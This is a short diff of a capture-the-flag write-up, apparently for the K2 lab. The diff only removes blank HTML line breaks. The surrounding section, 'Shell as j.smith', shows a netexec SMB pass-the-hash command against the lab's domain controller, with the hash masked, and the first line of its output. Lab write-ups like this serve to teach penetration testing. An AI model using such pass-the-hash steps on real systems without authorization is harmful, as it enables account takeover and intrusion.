@@ -181,10 +181,6 @@ j.smith
 <h1 align="center">Shell as <strong>j.smith</strong></h1>
 <p align="center">The hash identified for Administrator in Task 2 (••••••••••••••••••••••••••••••••) allowed to obtain shell.</p>
 
-<br>
-<br>
-<br>
-
 ```bash
 :~/K2# nxc smb K2RootDC.k2.thm -u 'j.smith' -H '••••••••••••••••••••••••••••••••'
 SMB         xx.xxx.xxx.xx   445    K2ROOTDC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:K2ROOTDC) (domain:k2.thm) (signing:True) (SMBv1:False) 
